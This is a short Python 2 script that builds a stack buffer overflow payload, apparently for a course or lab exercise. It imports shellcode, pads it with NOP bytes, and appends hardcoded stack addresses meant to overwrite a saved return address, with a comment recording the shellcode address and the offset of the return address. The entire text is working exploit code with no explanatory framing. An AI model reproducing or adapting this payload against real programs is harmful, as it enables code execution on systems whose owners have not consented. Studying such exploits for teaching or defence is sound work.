from shellcode import shellcode
strfill = chr(0x09) + chr(0x0) + chr(0x0) + chr(0x40) + shellcode + chr(0x90)
fillingcopy = chr(0x90) + chr(0x90) + chr(0x90) + chr(0x90)
for i in range(0,20):
	strfill = strfill + fillingcopy
# addr of my shellcode : 0xbffef1c8, addr of where ret addr is located : 0xbffef1c8 + 2056, bffef9d0
pa = ("\xf8\xf9\xfe\xbf\x70\xf9\xfe\xbf")
#print shellcode + strfill + pa
print strfill + pa
